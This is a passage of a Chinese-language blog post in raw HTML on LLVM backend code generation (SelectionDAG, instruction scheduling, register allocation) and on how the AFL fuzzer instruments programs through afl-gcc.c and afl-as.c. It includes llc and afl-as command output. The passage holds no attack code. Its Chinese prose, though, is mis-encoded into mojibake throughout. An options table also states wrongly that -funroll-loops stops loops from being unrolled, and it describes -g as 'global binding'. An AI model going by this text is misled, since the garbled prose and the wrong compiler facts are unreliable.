href="#åç«¯ç”Ÿæˆ-12" class="headerlink" title="åç«¯ç”Ÿæˆ[12]"></a>åç«¯ç”Ÿæˆ<sup>[12]</sup></h4><ul><li>åç«¯ä¸»è¦çš„æ­¥éª¤å°±æ˜¯å°†LLVM IRè½¬æ¢ä¸ºç›®æ ‡æ±‡ç¼–ä»£ç ï¼Œå…·ä½“æ­¥éª¤å¦‚å›¾8æ‰€ç¤ºï¼š</li></ul><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/8.png"></p><center>å›¾8 LLVM IRåˆ°ç›®æ ‡æ±‡ç¼–ä»£ç çš„æµç¨‹</center><ul><li><p>ç®€è¦æè¿°ä¸Šè¿°ä»£ç ç”Ÿæˆçš„å„ä¸ªé˜¶æ®µï¼š</p><ul><li><p><strong>æŒ‡ä»¤é€‰æ‹©</strong>ï¼ˆinstruction selectionï¼‰ï¼š</p><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å°†å†…å­˜ä¸­çš„IRè¡¨ç¤ºå˜æ¢ä¸ºç›®æ ‡ç‰¹å®šçš„selectionDAGèŠ‚ç‚¹ï¼Œæ¯ä¸€ä¸ªDAGè¡¨ç¤ºå•ä¸€åŸºæœ¬å—çš„è®¡ç®—</p><p>ä½ å¯ä»¥ä½¿ç”¨debugç‰ˆæœ¬çš„llcæ¥ç”ŸæˆselectionDAGèŠ‚ç‚¹ä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /llvm-project/build/bin/llc -debug sum.bc <span class="hljs-comment"># è¿™é‡Œä½¿ç”¨debugç‰ˆæœ¬çš„clangï¼</span><br>...<br>SelectionDAG has 18 nodes:<br>  t0: ch = EntryToken<br>  t6: i64 = Constant&lt;0&gt;<br>      t2: i32,ch = CopyFromReg t0, Register:i32 %0<br>    t8: ch = store&lt;ST4[%a.addr]&gt; t0, t2, FrameIndex:i64&lt;0&gt;, undef:i64<br>    t4: i32,ch = CopyFromReg t0, Register:i32 %1<br>  t10: ch = store&lt;ST4[%b.addr]&gt; t8, t4, FrameIndex:i64&lt;1&gt;, undef:i64<br>      t11: i32,ch = load&lt;LD4[%a.addr](dereferenceable)&gt; t10, FrameIndex:i64&lt;0&gt;, undef:i64<br>      t12: i32,ch = load&lt;LD4[%b.addr](dereferenceable)&gt; t10, FrameIndex:i64&lt;1&gt;, undef:i64<br>    t13: i32 = add nsw t11, t12<br>  t16: ch,glue = CopyToReg t10, Register:i32 %eax, t13<br>  t17: ch = X86ISD::RET_FLAG t16, TargetConstant:i32&lt;0&gt;, Register:i32 %eax, t16:1<br>...<br></code></pre></td></tr></tbody></table></figure><p>æ­¤å¤–ï¼Œä½ å¯ä»¥æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤æ¥ç”ŸæˆselectionDAGå›¾ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /llvm-project/build/bin/llc -view-dag-combine1-dags sum.bc -fast-isel=<span class="hljs-literal">false</span><br></code></pre></td></tr></tbody></table></figure><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/9.png"></p><center>å›¾9 sumå‡½æ•°çš„SelectionDAGå›¾</center><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> åˆ©ç”¨<strong>æ¨¡å¼åŒ¹é…</strong>å°†ç›®æ ‡æ— å…³çš„èŠ‚ç‚¹è½¬æ¢ä¸ºç›®æ ‡ç‰¹å®šçš„èŠ‚ç‚¹ï¼Œè€ŒæŒ‡ä»¤é€‰æ‹©çš„ç®—æ³•æ˜¯å±€éƒ¨çš„ï¼Œæ¯æ¬¡ä½œç”¨SelectionDAGï¼ˆåŸºæœ¬å—ï¼‰çš„å®ä¾‹</p><p>å¯ä»¥æ‰§è¡Œä¸€ä¸‹å‘½ä»¤ç”ŸæˆæŒ‡ä»¤é€‰æ‹©åçš„SelectionDAGå›¾ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /llvm-project/build/bin/llc -view-sched-dags sum.bc -fast-isel=<span class="hljs-literal">false</span><br></code></pre></td></tr></tbody></table></figure><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/10.png"></p><center>å›¾10 æŒ‡ä»¤é€‰æ‹©åçš„sumå‡½æ•°çš„SelectionDAGå›¾</center><p>ç”±ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æŒ‡ä»¤é€‰æ‹©ä¹‹åï¼ŒåŸå…ˆDAGå›¾ä¸­çš„addèŠ‚ç‚¹è¢«æ›¿æ¢æˆADD32rrï¼ŒX86ISD::RET_FLAGè¢«æ›¿æ¢ä¸ºRETï¼Œloadè¢«æ›¿æ¢ä¸ºMOV32rmï¼Œstoreè¢«æ›¿æ¢ä¸ºMOV32mr</p></li><li><p><strong>æŒ‡ä»¤è°ƒåº¦</strong>ï¼ˆinstruction schedulingï¼‰ï¼š</p><ul><li>æŒ‡ä»¤å»¶è¿Ÿè¡¨ï¼šæ ¹æ®å…·ä½“ç¡¬ä»¶ä¿¡æ¯æ¥æé«˜æŒ‡ä»¤çº§å¹¶è¡Œï¼Œä»è€Œæé«˜åœ¨è®¡ç®—æœºä¸ŠæŒ‡ä»¤æµæ°´çº¿çš„æ€§èƒ½ [14]</li><li>é£é™©æ£€æµ‹ä¸è¯†åˆ«</li><li>è°ƒåº¦å•å…ƒ</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /llvm-project/build/bin/llc -view-sunit-dags sum.bc -fast-isel=<span class="hljs-literal">false</span><br></code></pre></td></tr></tbody></table></figure><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/11.png"></p><center>å›¾11 è°ƒåº¦å•å…ƒå›¾</center></li><li><p><strong>å¯„å­˜å™¨åˆ†é…</strong>ï¼ˆRegister allocationï¼‰</p><ul><li><p>ä½œç”¨åœ¨<strong>æœºå™¨æŒ‡ä»¤</strong>ä¸Šï¼š</p><ul><li>åœ¨æŒ‡ä»¤è°ƒåº¦ä¹‹åï¼ŒInstrEmitter Passä¼šè¢«è¿è¡Œï¼Œå®ƒå°†<code>SDNode</code>æ ¼å¼è½¬æ¢ä¸º<code>MachineInstr</code>æ ¼å¼</li><li>è¯¥è¡¨ç¤ºç›¸è¾ƒäºIRæŒ‡ä»¤æ›´æ¥è¿‘å®é™…çš„ç›®æ ‡æŒ‡ä»¤</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /llvm-project/build/bin/llc -march=sparc -print-machineinstrs sum.bc<br>...<br><span class="hljs-comment"># After Instruction Selection:</span><br><span class="hljs-comment"># Machine code for function sum: IsSSA, TracksLiveness</span><br>Frame Objects:<br>  <span class="hljs-keyword">fi</span><span class="hljs-comment">#0: size=4, align=4, at location [SP]</span><br>  <span class="hljs-keyword">fi</span><span class="hljs-comment">#1: size=4, align=4, at location [SP]</span><br>Function Live Ins: %i0 <span class="hljs-keyword">in</span> %0, %i1 <span class="hljs-keyword">in</span> %1<br><br>%bb.0: derived from LLVM BB %entry<br>    Live Ins: %i0 %i1<br>%1:intregs = COPY %i1; IntRegs:%1<br>%0:intregs = COPY %i0; IntRegs:%0<br>%3:intregs = COPY %1; IntRegs:%3,%1<br>%2:intregs = COPY %0; IntRegs:%2,%0<br>STri %stack.0.a.addr, 0, %0; mem:ST4[%a.addr] IntRegs:%0<br>STri %stack.1.b.addr, 0, %1; mem:ST4[%b.addr] IntRegs:%1<br>%4:intregs = LDri %stack.0.a.addr, 0; mem:LD4[%a.addr](dereferenceable) IntRegs:%4<br>%5:intregs = LDri %stack.1.b.addr, 0; mem:LD4[%b.addr](dereferenceable) IntRegs:%5<br>%6:intregs = ADDrr killed %4, killed %5; IntRegs:%6,%4,%5<br>%i0 = COPY %6; IntRegs:%6<br>RETL 8, implicit %i0<br>...<br></code></pre></td></tr></tbody></table></figure></li><li><p><strong>åŸºæœ¬ä»»åŠ¡ï¼š</strong>å°†æ— é™æ•°é‡çš„è™šæ‹Ÿå¯„å­˜å™¨è½¬æ¢ä¸ºæœ‰é™çš„ç‰©ç†å¯„å­˜å™¨</p></li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /llvm-project/build/bin/llc -print-after=greedy sum.bc<br><span class="hljs-comment"># *** IR Dump After Greedy Register Allocator ***:</span><br><span class="hljs-comment"># Machine code for function sum: NoPHIs, TracksLiveness</span><br>Frame Objects:<br>  <span class="hljs-keyword">fi</span><span class="hljs-comment">#0: size=4, align=4, at location [SP+8]</span><br>  <span class="hljs-keyword">fi</span><span class="hljs-comment">#1: size=4, align=4, at location [SP+8]</span><br>Function Live Ins: %edi <span class="hljs-keyword">in</span> %0, %esi <span class="hljs-keyword">in</span> %2<br><br>0B%bb.0: derived from LLVM BB %entry<br>    Live Ins: %edi %esi<br>16B%3:gr32 = COPY %esi; GR32:%3<br>32B%1:gr32 = COPY %edi; GR32:%1<br>80BMOV32mr %stack.0.a.addr, 1, %noreg, 0, %noreg, %1; mem:ST4[%a.addr] GR32:%1<br>96BMOV32mr %stack.1.b.addr, 1, %noreg, 0, %noreg, %3; mem:ST4[%b.addr] GR32:%3<br>112B%7:gr32 = MOV32rm %stack.0.a.addr, 1, %noreg, 0, %noreg; mem:LD4[%a.addr] GR32:%7<br>144B%7:gr32 = ADD32rm %7, %stack.1.b.addr, 1, %noreg, 0, %noreg, implicit-def dead %eflags; mem:LD4[%b.addr] GR32:%7<br>160B%eax = COPY %7; GR32:%7<br>176BRETQ implicit %eax<br><br><span class="hljs-comment"># End machine code for function sum.</span><br><br></code></pre></td></tr></tbody></table></figure><ul><li>å¯„å­˜å™¨åˆå¹¶å™¨ã€è™šæ‹Ÿå¯„å­˜å™¨é‡å†™å’Œç›®æ ‡é’©å­</li></ul></li></ul></li></ul><h2 id="II-AFLå¦‚ä½•è¿›è¡Œæ’æ¡©ï¼Ÿ"><a href="#II-AFLå¦‚ä½•è¿›è¡Œæ’æ¡©ï¼Ÿ" class="headerlink" title="II. AFLå¦‚ä½•è¿›è¡Œæ’æ¡©ï¼Ÿ"></a>II. AFLå¦‚ä½•è¿›è¡Œæ’æ¡©ï¼Ÿ</h2><ul><li><p>åŸç”ŸAFLæœ‰<strong>ä¸¤ç§æ’æ¡©æ–¹å¼</strong></p><ul><li><p>åŸºäºç¼–è¯‘å™¨ç”Ÿæˆçš„æ±‡ç¼–æ–‡ä»¶çš„æ’æ¡©</p><ul><li>å…³é”®æ–‡ä»¶æœ‰ä¸¤ä¸ªï¼Œåˆ†åˆ«æ˜¯<code>afl-gcc.c</code>å’Œ<code>afl-as.c</code></li><li><code>afl-gcc/g++/clang/clang++/gcj</code>ï¼šç¼–è¯‘å™¨ï¼ˆgccã€clangã€gcjï¼‰çš„ä¸€ä¸ªwrapper <span class="github-emoji"><span>â¡</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/27a1.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ç¼–è¯‘å™¨äº§ç”Ÿæ±‡ç¼–æ–‡ä»¶</li><li><code>afl-as</code>ï¼šæ±‡ç¼–å™¨ï¼ˆasï¼‰çš„ä¸€ä¸ªwrapper <span class="github-emoji"><span>â¡</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/27a1.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å¯¹ç¼–è¯‘å™¨äº§ç”Ÿçš„æ±‡ç¼–æ–‡ä»¶è¿›è¡Œæ’æ¡©ï¼Œç„¶åè°ƒç”¨<code>as</code>ç”Ÿæˆç›®æ ‡æ–‡</li></ul><p>å›¾è§£ï¼š</p><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/12.png"></p><center>å›¾12 åŸºäºç¼–è¯‘å™¨çš„AFLæ’æ¡©æµç¨‹</center></li><li><p>åŸºäºLLVMæ¨¡å¼çš„æ’æ¡©</p><ul><li>å…³é”®æ–‡ä»¶å³<code>llvm_mode</code>æ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</li></ul></li></ul></li></ul><h3 id="a-åŸºäºç¼–è¯‘å™¨æ±‡ç¼–æ–‡ä»¶çš„æ’æ¡©"><a href="#a-åŸºäºç¼–è¯‘å™¨æ±‡ç¼–æ–‡ä»¶çš„æ’æ¡©" class="headerlink" title="a. åŸºäºç¼–è¯‘å™¨æ±‡ç¼–æ–‡ä»¶çš„æ’æ¡©"></a>a. åŸºäºç¼–è¯‘å™¨æ±‡ç¼–æ–‡ä»¶çš„æ’æ¡©</h3><h4 id="1-afl-gcc-c"><a href="#1-afl-gcc-c" class="headerlink" title="1. afl-gcc.c"></a>1. afl-gcc.c</h4><ul><li><p>æ˜¯ä¸»æµç¼–è¯‘å™¨çš„ä¸€ä¸ªwrapperï¼Œæ ¹æ®å…·ä½“è°ƒç”¨çš„<code>afl-xxx</code>ç¼–è¯‘å™¨åæ¥è¿›è¡Œåˆ†æµï¼š</p><ul><li><p><code>afl-xxx</code>ç¼–è¯‘å™¨éƒ½æ˜¯<code>afl-gcc</code>çš„ä¸€ä¸ªè½¯é“¾æ¥ï¼Œå¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ll afl-gcc afl-g++ afl-clang afl-clang++<br>lrwxrwxrwx 1 chan chan     7 Nov  3 23:52 afl-clang -&gt; afl-gcc*<br>lrwxrwxrwx 1 chan chan     7 Nov  3 23:52 afl-clang++ -&gt; afl-gcc*<br>lrwxrwxrwx 1 chan chan     7 Nov  3 23:52 afl-g++ -&gt; afl-gcc*<br>-rwxrwxr-x 1 chan chan 22976 Nov  3 23:52 afl-gcc*<br></code></pre></td></tr></tbody></table></figure></li></ul></li><li><p>ä¸<code>afl-as</code>çš„ç»“åˆä½¿ç”¨ï¼šä½¿ç”¨<code>gcc/clang</code> <code>-B</code>é€‰é¡¹æ¥æŒ‡å®šæ±‡ç¼–å™¨è·¯å¾„ï¼Œå³AFLæœ¬èº«çš„è·¯å¾„</p><p>æ¢è¨€ä¹‹ï¼Œ<code>afl-gcc</code>æœ¬è´¨ä¸Šè¿˜æ˜¯è°ƒç”¨çš„åŸæ¥çš„ç¼–è¯‘å™¨ï¼Œåªä¸è¿‡å°†æ±‡ç¼–å™¨æ›¿æ¢ä¸ºäº†<code>afl-as</code>ï¼ˆè€Œ<code>afl-as</code>çš„ä¸»è¦ä½œç”¨å°±æ˜¯è¿›è¡Œæ’æ¡©ï¼ï¼‰</p></li><li><p><strong>æºç è§£æ</strong>ï¼š</p><ul><li><p><code>find_as()</code>ï¼šåœ¨ç¯å¢ƒå˜é‡<code>AFL_PATH</code>ã€AFLæœ¬èº«çš„è·¯å¾„ã€‘æä¾›â€å‡çš„â€GNUæ±‡ç¼–å™¨ï¼Œå³<code>AFL_PATH/as</code>ï¼›æˆ–è€…æ ¹æ®<code>argv[0]</code>çš„è·¯å¾„è¿›è¡Œæ´¾ç”Ÿã€‚<span class="github-emoji"><span>ğŸ““</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f4d3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> æ³¨ï¼šè¿™é‡Œçš„<code>as</code>æœ¬èº«ä¹Ÿæ˜¯<code>afl-as</code>çš„ä¸€ä¸ªè½¯é“¾æ¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ll afl-as as<br>-rwxrwxr-x 1 chan chan 37544 Nov  3 23:52 afl-as*<br>lrwxrwxrwx 1 chan chan     6 Nov  3 23:52 as -&gt; afl-as*<br></code></pre></td></tr></tbody></table></figure></li><li><p><code>edit_params()</code>ï¼šæ„é€ æ–°çš„å‘½ä»¤è¡Œé€‰é¡¹ï¼Œå³å°†<code>argv</code>ä¸­çš„é€‰é¡¹æ‹·è´åˆ°<code>cc_params</code>ä¸­ï¼ŒåŒæ—¶æä¾›ä¸€äº›å¿…è¦çš„ç¼–è¾‘ï¼š</p><ul><li><p>é¦–å…ˆå¯¹<code>argv[0]</code>è¿›è¡ŒåŒ¹é…ï¼Œå³è¿›è¡Œåˆ†æµï¼š</p><p><code>afl-clang</code> =&gt; <code>clang</code>; </p><p><code>afl-clang++</code> =&gt; <code>clang++</code>; </p><p><code>afl-g++</code> =&gt; <code>g++</code>; </p><p><code>afl-gcj</code> =&gt; <code>gcj</code>; </p><p><code>afl-gcc</code> =&gt; <code>gcc</code></p></li><li><p>ç„¶åå°†<code>argv</code>ä¸­å…¶ä»–çš„é€‰é¡¹æ‹·è´åˆ°<code>cc_params</code>ï¼Œåœ¨è¿™è¿‡ç¨‹ä¸­ï¼Œå¯¹ä¸€äº›é€‰é¡¹è¿›è¡Œå¤„ç†ï¼š</p><ul><li><code>-B</code>å°†è¢«è¦†å†™</li><li><code>-integrated-as</code>ã€<code>-pipe</code>ã€å°†è¢«åˆ é™¤</li><li>å¦‚æœé‡åˆ°<code>-fsanitize=address</code>æˆ–<code>-fsanitize=memory</code>æ—¶ï¼Œå°†<code>asan_set</code>æ ‡å¿—å˜é‡è®¾ç½®ä¸º1ï¼Œå°†é€‰é¡¹æ·»åŠ åˆ°<code>cc_params</code></li><li>å¦‚æœé‡åˆ°<code>FORTIFY_SOURCE</code>è®¾ç½®é¡¹ï¼Œåˆ™å°†<code>fortify_set</code>æ ‡å¿—å˜é‡è®¾ç½®ä¸º1ï¼Œå°†é€‰é¡¹æ·»åŠ åˆ°<code>cc_params</code>  <em># ç¼–è¯‘å™¨çš„ä¸€ç§å®‰å…¨æ£€æµ‹æœºåˆ¶ï¼Œé˜²æº¢å‡º</em></li></ul></li><li><p>ç„¶åæ·»åŠ -Bé€‰é¡¹ï¼Œå³<code>-B as_path</code>ï¼Œ<code>as_path</code>ä¸º<code>find_as()</code>å‡½æ•°è®¾ç½®çš„æ±‡ç¼–å™¨è·¯å¾„ã€‚æ¥ç€è¿›è¡Œ5ä¸ªåˆ¤æ–­ï¼š</p><ul><li><p>å¦‚æœæ˜¯<code>clang_mode</code>ï¼Œæ·»åŠ <code>-no-integrated-as</code>é€‰é¡¹ä»¥é¿å…ä½¿ç”¨clangé›†æˆçš„æ±‡ç¼–å™¨</p></li><li><p>å¦‚æœè®¾ç½®äº†ç¯å¢ƒå˜é‡<code>AFL_HARDEN</code>ï¼Œåˆ™æ·»åŠ  <code>-fstack-protector-all</code> [15] å’Œ <code>-D_FORTIFY_SOURCE=2</code></p></li><li><p>å¦‚æœ<code>asan_set == 1</code>ï¼Œåˆ™å°†ç¯å¢ƒå˜é‡<code>AFL_USE_ASAN</code>è®¾ç½®ä¸º1ï¼›å¦åˆ™ï¼Œåˆ¤æ–­æ˜¯å¦è®¾ç½®äº†<code>AFL_USE_ASAN</code>æˆ–<code>AFL_USE_MSAN</code>ï¼Œå¹¶æ£€æŸ¥ç›¸åº”çš„äº’æ–¥æ€§å’Œæ·»åŠ ç›¸åº”çš„é€‰é¡¹ï¼ˆ<code>-U_FORTIFY_SOURCE</code> å’Œ <code>-fsanitize=address/memory</code>ï¼‰</p></li><li><p>å¦‚æœè®¾ç½®äº†ç¯å¢ƒå˜é‡<code>AFL_DONT_OPTIMIZE</code>ï¼Œé‚£ä¹ˆå°†ä¸è¿›è¡Œä¼˜åŒ–æ“ä½œï¼Œå¦åˆ™å°†æ·»åŠ ä¸‹è¿°é€‰é¡¹ï¼š</p><table><thead><tr><th>é€‰é¡¹</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>-g</td><td>å…¨å±€ç»‘å®šï¼Œä¸»è¦ç”¨äºdebug</td></tr><tr><td>-O3</td><td>O3çº§ä¼˜åŒ–</td></tr><tr><td>-funroll-loops</td><td>é¿å…ä¼˜åŒ–å™¨å±•å¼€å¾ªç¯ï¼Œå…¶ä¸»è¦ç›®çš„æœ‰ä¸¤ä¸ªï¼š<br><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ä¾¿äºå¯¹å¾ªç¯ä½“çš„è¾¹è¿›è¡Œè·Ÿè¸ª<br><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> é¿å…å¾ªç¯ä½“å†…å…¶ä»–è¾¹çš„æ•°é‡çˆ†ç‚¸ï¼ˆå¾ªç¯å±•å¼€åä¼šäº§ç”Ÿå†—ä½™è¾¹ï¼‰</td></tr><tr><td>-D__AFL_COMPILER=1</td><td># ä¸æ˜¯ç¼–è¯‘å™¨æœ¬èº«çš„é€‰é¡¹<br>åœ¨ChangeLogä¸­ï¼Œè¯¥å˜é‡ç”¨æ¥æŒ‡ç¤ºè¯¥ç¨‹åºæ˜¯åœ¨afl-gcc / afl-clang / afl-clang-fastä¸‹æ„å»ºçš„ï¼Œå¹¶ä¸”å…è®¸è‡ªå®šä¹‰çš„ä¼˜åŒ–</td></tr><tr><td>-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</td><td>-</td></tr></tbody></table></li><li><p>å¦‚æœè®¾ç½®äº†ç¯å¢ƒå˜é‡<code>AFL_NO_BUILTIN</code>ï¼Œé‚£ä¹ˆå°†ä¸è¿›è¡Œç›¸å…³å‡½æ•°çš„å†…ç½®æ›¿æ¢ï¼ˆå³æ±‡ç¼–å¤„å°†ä½¿ç”¨<code>call</code>ç›¸å…³å‡½æ•°ï¼Œå¯¹äº<code>AFLæ’æ¡©</code>æ¥è¯´ï¼Œè¿™å°†å¼•å…¥é¢å¤–çš„å¼€é”€ï¼Œå› æ­¤é»˜è®¤è¿›è¡Œ<code>builtin</code>ï¼‰ã€‚å…·ä½“æ¥è¯´ï¼Œé€šè¿‡æ·»åŠ ä¸‹è¿°é€‰é¡¹æ¥å®ç°ï¼š</p><table><thead><tr><th align="center">é€‰é¡¹</th></tr></thead><tbody><tr><td align="center">-fno-builtin-strcmp</td></tr><tr><td align="center">-fno-builtin-strncmp</td></tr><tr><td align="center">-fno-builtin-strcasecmp</td></tr><tr><td align="center">-fno-builtin-strncasecmp</td></tr><tr><td align="center">-fno-builtin-memcmp</td></tr><tr><td align="center">-fno-builtin-strstr</td></tr><tr><td align="center">-fno-builtin-strcasestr</td></tr></tbody></table></li></ul></li></ul></li><li><p><code>execvp()</code>ï¼šæ‰§è¡Œæ„é€ çš„å‘½ä»¤è¡Œï¼Œå³<code>cc_params</code>ã€‚è¯¥å‘½ä»¤è¡Œå°†è°ƒç”¨ç¼–è¯‘å™¨ç”Ÿæˆç›¸åº”çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ­£å¦‚å‰æ‰€è¿°ï¼Œ<code>-B</code>æŒ‡å®šäº†<code>afl</code>çš„æ±‡ç¼–å™¨è¿›è¡Œæ’æ¡©æ“ä½œï¼Œå› æ­¤ä¸‹é¢æˆ‘ä»¬å°†è¯¦ç»†ä»‹ç»<code>afl-as.c</code>çš„å…·ä½“æµç¨‹ã€‚</p></li></ul></li></ul><h4 id="2-afl-as-c"><a href="#2-afl-as-c" class="headerlink" title="2. afl-as.c"></a>2. afl-as.c</h4><ul><li><p>ç”±å‰æ‰€è¿°ï¼Œ<code>afl-gcc/clang/g++/clang++/gcj</code>é€šè¿‡<code>-B</code>å‚æ•°æŒ‡å®šäº†<code>AFLçš„æ±‡ç¼–å™¨</code>è·¯å¾„ï¼Œé‚£ä¹ˆåœ¨gcc/g++/clang/clang++/gcjç”Ÿæˆç›®æ ‡æ–‡ä»¶/å¯æ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹ä¸­ï¼Œå°†ä½¿ç”¨afl-asä½œä¸ºå…¶ç¼–è¯‘å™¨ï¼Œè€Œafl-asæœ¬èº«ä¹Ÿæ˜¯asä¸€ä¸ªwrapperï¼š</p><ul><li>å…ˆå¯¹ç¼–è¯‘å™¨äº§ç”Ÿçš„æ±‡ç¼–æ–‡ä»¶è¿›è¡Œ<strong>æ’æ¡©</strong></li><li>ç„¶åå†è°ƒç”¨ç³»ç»Ÿçš„<code>as</code>æ¥<strong>ç”Ÿæˆç›¸åº”çš„æœºå™¨ç </strong></li></ul></li><li><p><span class="github-emoji"><span>ğŸ’­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f4ad.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ä½†æ˜¯è¿™æ ·ä¸€æ¥æ— æ³•å¯¹<code>afl-as</code>è¿›è¡Œè°ƒè¯•ï¼Ÿ</p><ul><li><p>ç»è¿‡å¯¹<code>afl-as</code>çš„ç®€å•åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡<code>afl-gcc -S</code>ç”Ÿæˆæ±‡ç¼–æ–‡ä»¶ï¼Œç„¶åå°†æ±‡ç¼–æ–‡ä»¶æ”¾ç½®åœ¨<code>tmp</code>ç›®å½•ä¸‹</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ afl-gcc -S afl_inst_test.c -o afl_inst_test.s<br>afl-cc 2.57b by &lt;lcamtuf@google.com&gt;<br>afl_inst_test.c: In <span class="hljs-keyword">function</span> â€˜mainâ€™:<br>afl_inst_test.c:12:2: warning: ignoring <span class="hljs-built_in">return</span> value of â€˜scanfâ€™, declared with attribute warn_unused_result [-Wunused-result]<br>  scanf(<span class="hljs-string">"%d"</span>, &amp;a);<br>  ^~~~~~~~~~~~~~~<br>$ <span class="hljs-built_in">mv</span> afl_inst_test.s /tmp<br></code></pre></td></tr></tbody></table></figure></li><li><p>ä½¿ç”¨<code>afl-as</code>å¯¹ä¸Šè¿°äº§ç”Ÿçš„æ±‡ç¼–æ–‡ä»¶è¿›è¡Œæ±‡ç¼–æ“ä½œï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /home/chan/some_c_test/AFLAPI/afl-as -o afl_inst_test.o /tmp/afl_inst_test.s<br>afl-as 2.57b by &lt;lcamtuf@google.com&gt;<br>[+] Instrumented 4 locations (64-bit, non-hardened mode, ratio 100%).<br></code></pre></td></tr></tbody></table></figure><p>:happy:ç”±ä¸Šè¿°çš„ç»“æœï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºè¯¥æ±‡ç¼–æ–‡ä»¶å·²ç»æˆåŠŸæ’æ¡©äº†ã€‚ä½†è¿™é‡Œæˆ‘ä»¬æ— æ³•æ•è·åˆ°æ’æ¡©åçš„æ±‡ç¼–æ–‡ä»¶ï¼Œå› 